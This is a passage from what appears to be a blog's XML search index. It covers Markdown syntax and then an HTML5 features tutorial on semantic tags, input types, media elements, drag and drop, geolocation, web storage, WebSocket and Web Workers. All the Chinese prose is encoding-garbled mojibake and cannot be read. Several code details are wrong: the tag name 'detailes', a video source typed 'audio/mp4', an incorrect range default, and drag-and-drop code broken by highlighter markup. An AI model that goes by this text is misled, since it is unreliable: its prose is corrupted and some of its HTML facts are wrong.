åºåˆ—è¡¨"><a href="#7-æ— åºåˆ—è¡¨" class="headerlink" title="7. æ— åºåˆ—è¡¨"></a>7. æ— åºåˆ—è¡¨</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- åˆ—è¡¨å†…å®¹</span><br><span class="line">+ åˆ—è¡¨å†…å®¹</span><br><span class="line">* åˆ—è¡¨å†…å®¹</span><br></pre></td></tr></table></figure><p>åˆ—è¡¨åµŒå¥—: ä¸Šä¸€çº§å’Œä¸‹ä¸€çº§ä¹‹é—´æ•²ä¸‰ä¸ªç©ºæ ¼å³å¯</p><h4 id="8-è¡¨æ ¼"><a href="#8-è¡¨æ ¼" class="headerlink" title="8. è¡¨æ ¼"></a>8. è¡¨æ ¼</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¡¨å¤´|è¡¨å¤´|è¡¨å¤´</span><br><span class="line">---|:--:|---:</span><br><span class="line">å†…å®¹|å†…å®¹|å†…å®¹</span><br><span class="line">å†…å®¹|å†…å®¹|å†…å®¹</span><br></pre></td></tr></table></figure><h4 id="9-ä»£ç "><a href="#9-ä»£ç " class="headerlink" title="9. ä»£ç "></a>9. ä»£ç </h4>`å•è¡Œä»£ç `<br>```<br>  å¤šè¡Œä»£ç â€¦<br>  å¤šè¡Œä»£ç â€¦<br>  `` `]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>HTML5æ–°ç‰¹æ€§</title>
      <link href="/2017/08/07/HTML5%E6%96%B0%E7%89%B9%E6%80%A7/"/>
      <url>/2017/08/07/HTML5%E6%96%B0%E7%89%B9%E6%80%A7/</url>
      <content type="html"><![CDATA[<h4 id="1-è¯­ä¹‰åŒ–æ ‡ç­¾"><a href="#1-è¯­ä¹‰åŒ–æ ‡ç­¾" class="headerlink" title="1. è¯­ä¹‰åŒ–æ ‡ç­¾"></a>1. è¯­ä¹‰åŒ–æ ‡ç­¾</h4><p>ä»¥å‰æˆ‘ä»¬éƒ½æ˜¯ä½¿ç”¨<code>&lt;div&gt;</code>æ ‡ç­¾å¸ƒå±€ï¼Œdivæ ‡ç­¾çš„è¯­ä¹‰ä¸æ¸…æ™°ï¼Œhtml5ä¸ºäº†è§„èŒƒè¿™ä¸€å—ï¼Œç»™å‡ºäº†ä¸€ç³»åˆ—çš„æ ‡ç­¾ã€‚<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span><span class="tag">&lt;/<span class="name">header</span>&gt;</span>     å¤´éƒ¨åŒºåŸŸæ ‡ç­¾ï¼Œå—çº§æ ‡ç­¾</span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span><span class="tag">&lt;/<span class="name">footer</span>&gt;</span>     åº•éƒ¨åŒºåŸŸæ ‡ç­¾ï¼Œå—çº§æ ‡ç­¾</span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>           å¯¼èˆªåŒºåŸŸæ ‡ç­¾ï¼Œå—çº§æ ‡ç­¾</span><br><span class="line"><span class="tag">&lt;<span class="name">aside</span>&gt;</span><span class="tag">&lt;/<span class="name">aside</span>&gt;</span>       ä¾§è¾¹æ åŒºåŸŸæ ‡ç­¾ï¼Œå—çº§æ ‡ç­¾</span><br><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span><span class="tag">&lt;/<span class="name">section</span>&gt;</span>   å®šä¹‰ sectionï¼Œå—çº§æ ‡ç­¾</span><br><span class="line"><span class="tag">&lt;<span class="name">article</span>&gt;</span><span class="tag">&lt;/<span class="name">article</span>&gt;</span>   æ–‡ç« æ®µè½æ ‡ç­¾ï¼Œå—çº§æ ‡ç­¾</span><br><span class="line"><span class="tag">&lt;<span class="name">summary</span>&gt;</span><span class="tag">&lt;/<span class="name">summary</span>&gt;</span>   å®šä¹‰ details å…ƒç´ çš„æ ‡é¢˜ï¼Œå—çº§æ ‡ç­¾</span><br><span class="line"><span class="tag">&lt;<span class="name">detailes</span>&gt;</span><span class="tag">&lt;/<span class="name">detailes</span>&gt;</span> å®šä¹‰å…ƒç´ çš„ç»†èŠ‚ï¼Œå—çº§æ ‡ç­¾</span><br><span class="line"><span class="tag">&lt;<span class="name">mark</span>&gt;</span><span class="tag">&lt;/<span class="name">mark</span>&gt;</span>         æ ‡è®°è®°å·æ ‡ç­¾ï¼Œå†…è”æ ‡ç­¾</span><br><span class="line"><span class="tag">&lt;<span class="name">time</span>&gt;</span><span class="tag">&lt;/<span class="name">time</span>&gt;</span>         æ—¶é—´åŒºåŸŸæ ‡ç­¾ï¼Œå†…è”æ ‡ç­¾</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-è¡¨å•æ–°ç±»å‹"><a href="#2-è¡¨å•æ–°ç±»å‹" class="headerlink" title="2. è¡¨å•æ–°ç±»å‹"></a>2. è¡¨å•æ–°ç±»å‹</h4><p><code>&lt;input&gt;</code>è¡¨å•æ ‡ç­¾çš„æ–°ç±»å‹<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"email"</span> /&gt;</span>  e-mail åœ°å€çš„è¾“å…¥åŸŸ</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"number"</span> /&gt;</span> æ•°å­—è¾“å…¥åŸŸ</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"url"</span> /&gt;</span>    URL åœ°å€çš„è¾“å…¥åŸŸ</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"range"</span> /&gt;</span>  range ç±»å‹æ˜¾ç¤ºä¸ºæ»‘åŠ¨æ¡ï¼Œé»˜è®¤valueå€¼æ˜¯1~100çš„é™å®šèŒƒå›´</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"range"</span> <span class="attr">name</span>=<span class="string">"points"</span> <span class="attr">min</span>=<span class="string">"1"</span> <span class="attr">max</span>=<span class="string">"10"</span> /&gt;</span>  å¯ä»¥é€šè¿‡minå±æ€§å’Œmaxå±æ€§è‡ªå®šä¹‰èŒƒå›´</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"search"</span> /&gt;</span> ç”¨äºæœç´¢åŸŸ</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"color"</span> /&gt;</span>  ç”¨äºå®šä¹‰é€‰æ‹©é¢œè‰²</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"tel"</span> /&gt;</span>    ç”µè¯å·ç è¾“å…¥åŸŸ</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"date"</span> /&gt;</span>   dateç±»å‹ä¸ºæ—¶é—´é€‰æ‹©å™¨</span><br></pre></td></tr></table></figure></p><p><code>input</code>æ–°å¢çš„æ–°å±æ€§</p><ul><li><code>placeholder</code>: string, æ–‡æœ¬æ¡†çš„é»˜è®¤æç¤ºï¼Œåœ¨ç”¨æˆ·è¾“å…¥åæ¶ˆå¤±</li><li><code>required</code>: boolean, è¦æ±‚æ–‡æœ¬æ¡†ä¸èƒ½ä¸ºç©º</li><li><code>pattern</code>: regex, ç”¨äºéªŒè¯å€¼çš„æ­£åˆ™</li><li><code>min</code>, <code>max</code>: è®¾ç½®å…ƒç´ çš„æœ€å¤§æœ€å°å€¼</li><li><code>step</code>: è¾“å…¥åŸŸè§„å®šçš„æ•°å­—é—´éš”</li><li><code>width</code>, <code>height</code>: å®½é«˜</li><li><code>autofocus</code>: boolean, é¡µé¢åŠ è½½æ—¶ï¼ŒåŸŸè‡ªåŠ¨è·å¾—ç„¦ç‚¹</li><li><code>multiple</code>: booelan, è§„å®šå…ƒç´ å¯é€‰æ‹©å¤šä¸ªå€¼</li></ul><p><br></p><h4 id="3-è§†é¢‘å’ŒéŸ³é¢‘"><a href="#3-è§†é¢‘å’ŒéŸ³é¢‘" class="headerlink" title="3. è§†é¢‘å’ŒéŸ³é¢‘"></a>3. è§†é¢‘å’ŒéŸ³é¢‘</h4><p><code>&lt;audio&gt;</code>æ”¯æŒçš„éŸ³é¢‘æ ¼å¼æœ‰ mp3, Wav, Oggã€‚<br><code>&lt;video&gt;</code>æ”¯æŒ mp4, WebM, Oggã€‚<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">"1.mp3"</span> <span class="attr">id</span>=<span class="string">"audio"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">width</span>=<span class="string">"600"</span> <span class="attr">height</span>=<span class="string">"400"</span> <span class="attr">id</span>=<span class="string">"video"</span> <span class="attr">controls</span>=<span class="string">"controls"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"video/jieda2.mp4"</span> <span class="attr">type</span>=<span class="string">"audio/mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>è§†é¢‘å’ŒéŸ³é¢‘å¸¸ç”¨çš„æ–¹æ³•</p><ul><li><code>play()</code>  å¼€å§‹æ’­æ”¾</li><li><code>pause()</code> æš‚åœæ’­æ”¾</li><li><code>load()</code>  é‡æ–°åŠ è½½éŸ³é¢‘/è§†é¢‘</li></ul><p>è§†é¢‘å’Œè§†é¢‘å¸¸ç”¨çš„å±æ€§</p><ul><li><code>controls</code> æ˜¯å¦æ˜¾ç¤ºæ’­æ”¾/æš‚åœæ§ä»¶</li><li><code>defaultPlaybackRate</code> è®¾ç½®é»˜è®¤æ’­æ”¾é€Ÿåº¦</li><li><code>duration</code> è¿”å›å½“å‰éŸ³é¢‘/è§†é¢‘çš„é•¿åº¦(ä»¥ç§’è®¡)</li><li><code>ended</code> è¿”å›éŸ³é¢‘/è§†é¢‘æ˜¯å¦å·²ç»“æŸ</li><li><code>loop</code> è®¾ç½®æˆ–è¿”å›éŸ³é¢‘/è§†é¢‘æ˜¯å¦åº”åœ¨ç»“æŸæ—¶é‡æ–°æ’­æ”¾</li><li><code>muted</code> è®¾ç½®æˆ–è¿”å›éŸ³é¢‘/è§†é¢‘æ˜¯å¦é™éŸ³</li><li><code>networkState</code> è¿”å›éŸ³é¢‘/è§†é¢‘çš„å½“å‰ç½‘ç»œçŠ¶æ€</li><li><code>src</code> è®¾ç½®æˆ–è¿”å›éŸ³é¢‘/è§†é¢‘å…ƒç´ çš„å½“å‰æ¥æº</li><li><code>volume</code> è®¾ç½®æˆ–è¿”å›éŸ³é¢‘/è§†é¢‘çš„éŸ³é‡</li><li><code>readyState</code> è¿”å›éŸ³é¢‘/è§†é¢‘å½“å‰çš„å°±ç»ªçŠ¶æ€</li><li><code>played</code> è¡¨ç¤ºéŸ³é¢‘/è§†é¢‘å·²æ’­æ”¾éƒ¨åˆ†çš„ TimeRanges å¯¹è±¡</li></ul><p><br></p><h4 id="4-canvas"><a href="#4-canvas" class="headerlink" title="4. canvas"></a>4. canvas</h4><p><code>canvas</code> å…ƒç´ ç”¨äºåœ¨ç½‘é¡µä¸Šç»˜åˆ¶å›¾å½¢,canvasæ ‡ç­¾æœ¬èº«åªæ˜¯ä¸ªå›¾å‹å®¹å™¨ï¼Œéœ€è¦ä½¿ç”¨javaScriptè„šæœ¬æ¥ç»˜åˆ¶å›¾å½¢ã€‚</p><p><br></p><h4 id="5-SVG"><a href="#5-SVG" class="headerlink" title="5. SVG"></a>5. SVG</h4><p>SVGæ˜¯æŒ‡å¯ä¼¸ç¼©çš„çŸ¢é‡å›¾å½¢ï¼ŒSVG ä¹Ÿæ˜¯ä¸€ç§ä½¿ç”¨ XML æè¿° 2D å›¾å½¢çš„è¯­è¨€ã€‚æˆ‘ä»¬å¯ä»¥ä¸ºæŸä¸ªå…ƒç´ é™„åŠ  JavaScript äº‹ä»¶å¤„ç†å™¨ã€‚åœ¨ SVG ä¸­ï¼Œæ¯ä¸ªè¢«ç»˜åˆ¶çš„å›¾å½¢å‡è¢«è§†ä¸ºå¯¹è±¡ã€‚å¦‚æœ SVG å¯¹è±¡çš„å±æ€§å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆæµè§ˆå™¨èƒ½å¤Ÿè‡ªåŠ¨é‡ç°å›¾å½¢ã€‚</p><p><br></p><h4 id="6-æ‹–æ”¾-Dragå’ŒDrop"><a href="#6-æ‹–æ”¾-Dragå’ŒDrop" class="headerlink" title="6. æ‹–æ”¾(Dragå’ŒDrop)"></a>6. æ‹–æ”¾(Dragå’ŒDrop)</h4><p>åœ¨h5ä¹‹å‰å®ç°æ‹–æ‹½åŠŸèƒ½ï¼Œç”¨çš„æ˜¯<code>onmousedown</code>ï¼Œè·å–å½“å‰çš„ä¸€äº›ä¿¡æ¯ï¼Œç„¶ååœ¨<code>onmousemove</code>æ—¶ä¸æ–­æ›´æ–°æ‹–æ‹½å¯¹è±¡çš„<code>left</code>å’Œ<code>top</code>å€¼ï¼Œæœ€ååœ¨<code>onmouseup</code>æ—¶å¯¹æ‹–æ‹½å¯¹è±¡å½»åº•å¤åˆ¶ï¼Œå¹¶é‡Šæ”¾åä¸€ç³»åˆ—çš„ç¨‹åºæ“ä½œã€‚</p><p>h5å‡ºæ¥åï¼Œä¸éœ€è¦å†æ¨¡æ‹Ÿï¼Œå› ä¸ºå·²ç»æœ‰äº†æ ‡å‡†çš„äº‹ä»¶api<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"draggable"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"draggable"</span> draggable=<span class="string">"true"</span>&gt;</span><br><span class="line">draggable</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">var dragEl = document.getElementById('draggable');</span></span><br><span class="line"><span class="regexp">var l = null, t = null;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">dragEl.ondragstart = function (e) &#123; /</span><span class="regexp">/ å‡†å¤‡æ¨æ‹½æ—¶</span></span><br><span class="line"><span class="regexp">  l = e.clientX - this.offsetLeft, t = e.clientY - this.offsetTop;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">dragEl.ondrag = function (e) &#123;  /</span><span class="regexp">/ æ‹–æ‹½è¿›è¡Œæ—¶</span></span><br><span class="line"><span class="regexp">  var x = e.clientX, y = e.clientY;</span></span><br><span class="line"><span class="regexp">  this.style.left = x - l + 'px';</span></span><br><span class="line"><span class="regexp">  this.style.top = y - t + 'px';</span></span><br><span class="line"><span class="regexp">  console.log(x, y, l , t)</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">dragEl.ondragend = function (e) &#123;   /</span><span class="regexp">/ æ‹–æ‹½ç»“æŸæ—¶</span></span><br><span class="line"><span class="regexp">  var x = e.clientX, y = e.clientY;</span></span><br><span class="line"><span class="regexp">  this.style.left = x - l + 'px';</span></span><br><span class="line"><span class="regexp">  this.style.top = y - t + 'px';</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="7-åœ°ç†ä½ç½®"><a href="#7-åœ°ç†ä½ç½®" class="headerlink" title="7. åœ°ç†ä½ç½®"></a>7. åœ°ç†ä½ç½®</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">navigator.geolocation.getCurrentPosition(successPos)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">successPos</span> (<span class="params">pos</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'å®šä½æ—¶é—´ï¼š'</span>,pos.timestamp)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'ç»åº¦ï¼š'</span>,pos.coords.longitude)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'çº¬åº¦ï¼š'</span>,pos.coords.latitude)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'æµ·æ‹”ï¼š'</span>,pos.coords.altitude)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'é€Ÿåº¦ï¼š'</span>,pos.coords.speed)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="8-ç¦»çº¿å­˜å‚¨"><a href="#8-ç¦»çº¿å­˜å‚¨" class="headerlink" title="8. ç¦»çº¿å­˜å‚¨"></a>8. ç¦»çº¿å­˜å‚¨</h4><p>HTML5ï¼Œé€šè¿‡åˆ›å»º cache manifest æ–‡ä»¶ï¼Œå¯ä»¥åˆ›å»º web åº”ç”¨çš„ç¦»çº¿ç‰ˆæœ¬</p><p><br></p><h4 id="9-Webå­˜å‚¨"><a href="#9-Webå­˜å‚¨" class="headerlink" title="9. Webå­˜å‚¨"></a>9. Webå­˜å‚¨</h4><p><code>localStorage</code> æ²¡æœ‰æ—¶é—´é™åˆ¶çš„æ•°æ®å­˜å‚¨.<br><code>sessionStorage</code> ç½‘é¡µè¿˜æ²¡æœ‰å…³é—­çš„æƒ…å†µä¸‹çš„å­˜å‚¨ï¼Œç½‘é¡µçª—å£å…³é—­ï¼Œåˆ™æ•°æ®é”€æ¯ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">localStorage.setItem(<span class="string">'key'</span>, <span class="string">'val'</span>)  <span class="comment">// å­˜å‚¨æ•°æ®</span></span><br><span class="line">localStorage.getItem(<span class="string">'key'</span>)         <span class="comment">// å–æ•°æ®</span></span><br><span class="line">localStorage.removeItem(<span class="string">'key'</span>)      <span class="comment">// åˆ é™¤æ•°æ®</span></span><br><span class="line">localStorage.clear()                <span class="comment">// åˆ é™¤æ‰€æœ‰æ•°æ®</span></span><br><span class="line">localStorage.key(index)             <span class="comment">// è·å–æŸä¸ªç´¢å¼•æ•°æ®</span></span><br><span class="line"></span><br><span class="line">sessionStorage.setItem(<span class="string">'key'</span>, <span class="string">'val'</span>)<span class="comment">// å­˜å‚¨æ•°æ®</span></span><br><span class="line">sessionStorage.getItem(<span class="string">'key'</span>)       <span class="comment">// å–æ•°æ®</span></span><br><span class="line">sessionStorage.removeItem(<span class="string">'key'</span>)    <span class="comment">// åˆ é™¤æ•°æ®</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="10-WebSocket"><a href="#10-WebSocket" class="headerlink" title="10. WebSocket"></a>10. WebSocket</h4><p>websocketäº‹ä»¶</p><ul><li>Socket.onopen è¿æ¥å»ºç«‹æ—¶è§¦å‘</li><li>Socket.onmessage å®¢æˆ·ç«¯æ¥æ”¶æœåŠ¡ç«¯æ•°æ®æ—¶è§¦å‘</li><li>Socket.onerror é€šä¿¡å‘ç”Ÿé”™è¯¯æ—¶è§¦å‘</li><li>Socket.onclose è¿æ¥å…³é—­æ—¶è§¦å‘</li></ul><p><br></p><h4 id="11-Web-Workers"><a href="#11-Web-Workers" class="headerlink" title="11. Web Workers"></a>11. Web Workers</h4><p>web worker æ˜¯è¿è¡Œåœ¨åå°çš„ JavaScriptï¼Œç‹¬ç«‹äºå…¶ä»–è„šæœ¬ï¼Œä¸ä¼šå½±å“é¡µé¢çš„æ€§èƒ½ã€‚æ‚¨å¯ä»¥ç»§ç»­åšä»»ä½•æ„¿æ„åšçš„äº‹æƒ…ã€‚</p><p><br></p><h4 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h4><ul><li><a href="https://juejin.im/post/5be8d817e51d457f7a4aba13" target="_blank" rel="noopener">HTML5çš„æ–°ç‰¹æ€§æ¦‚è¿°ï¼ˆä¸Šï¼‰</a></li><li><a href="https://juejin.im/post/5bea349a518825170d1a9db1" target="_blank" rel="noopener">HTML5æ–°ç‰¹æ€§æ¦‚è¿°(ä¸‹)</a></li></ul>]]></content>
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
    </entry>
    
  
  
</search>
